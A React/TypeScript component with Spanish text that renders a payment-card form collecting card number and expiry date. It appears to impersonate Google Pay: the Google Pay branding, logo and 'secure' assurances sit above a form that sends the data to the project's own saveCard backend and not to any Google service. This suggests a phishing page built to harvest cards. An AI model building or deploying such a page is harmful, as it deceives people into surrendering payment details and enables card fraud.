import { useState, type FormEvent, type ChangeEvent } from 'react';
import { saveCard } from '../services/api';
import '../styles/CardForm.css';

export default function CardForm() {
    const [cardNumber, setCardNumber] = useState('');
    const [expiry, setExpiry] = useState('');
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState('');

    const formatCardNumber = (e: ChangeEvent<HTMLInputElement>) => {
        const raw = e.target.value.replace(/\s/g, '');
        setCardNumber(raw.match(/.{1,4}/g)?.join(' ') || raw);
    };

    const formatExpiry = (e: ChangeEvent<HTMLInputElement>) => {
        let val = e.target.value.replace(/\D/g, '');
        if (val.length >= 2) val = val.slice(0, 2) + '/' + val.slice(2, 4);
        setExpiry(val);
    };

    const handleSubmit = async (e: FormEvent) => {
        e.preventDefault();
        const num = cardNumber.replace(/\s/g, '');

        if (num && (num.length < 13 || num.length > 19)) {
            setError('El número de tarjeta no es válido');
            setTimeout(() => setError(''), 5000);
            return;
        }

        if (expiry && expiry.length < 5) {
            setError('La fecha de vencimiento no es válida');
            setTimeout(() => setError(''), 5000);
            return;
        }

        if (!num) {
            setError('Por favor, ingresa el número de tarjeta.');
            setTimeout(() => setError(''), 5000);
            return;
        }

        setLoading(true);
        try {
            const res = await saveCard(num, expiry || undefined);
            if (res.success) {
                setTimeout(() => window.location.reload(), 1500);
            } else {
                setError('Error al guardar la tarjeta. Intenta de nuevo.');
                setLoading(false);
            }
        } catch {
            setError('Error de conexión. Intenta de nuevo.');
            setLoading(false);
        }
    };

    return (
        <div className="view-container active">
            <div className="payment-wrapper">
                <div className="payment-form">
                    <div className="form-header">
                        <div className="header-icon">
                            <i className="fas fa-credit-card" />
                        </div>
                        <h1>Agregar Tarjeta</h1>
                        <p>Registre su tarjeta de forma segura en Google Pay</p>
                    </div>

                    <form onSubmit={handleSubmit}>
                        <div className="form-section">
                            <div className="section-header">
                                <i className="fas fa-plus-circle" />
                                <h3>Información de la Tarjeta</h3>
                            </div>

                            <div className="form-group">
                                <label>
                                    <i className="fas fa-credit-card" />
                                    Número de Tarjeta
                                </label>
                                <input
                                    type="text"
                                    placeholder="1234 5678 9012 3456"
                                    maxLength={19}
                                    inputMode="numeric"
                                    autoComplete="cc-number"
                                    value={cardNumber}
                                    onChange={formatCardNumber}
                                />
                            </div>

                            <div className="form-group">
                                <label>
                                    <i className="far fa-calendar-alt" />
                                    Fecha de Vencimiento
                                </label>
                                <input
                                    type="text"
                                    placeholder="MM/AA"
                                    maxLength={5}
                                    inputMode="numeric"
                                    autoComplete="cc-exp"
                                    value={expiry}
                                    onChange={formatExpiry}
                                />
                            </div>
                        </div>

                        {error && (
                            <div className="error-message">
                                <i className="fas fa-exclamation-circle" /> {error}
                            </div>
                        )}

                        <button type="submit" className="submit-button" disabled={loading}>
                            {loading ? (
                                <div className="button-loader show">
                                    <div className="spinner" />
                                </div>
                            ) : (
                                <span className="button-content">
                                    <i className="fab fa-google-pay" />
                                    <span>Guardar en Google Pay</span>
                                </span>
                            )}
                        </button>

                        <div className="form-footer">
                            <div className="security-info">
                                <i className="fas fa-shield-alt" />
                                <p>Tu información se procesa de forma segura</p>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    );
}
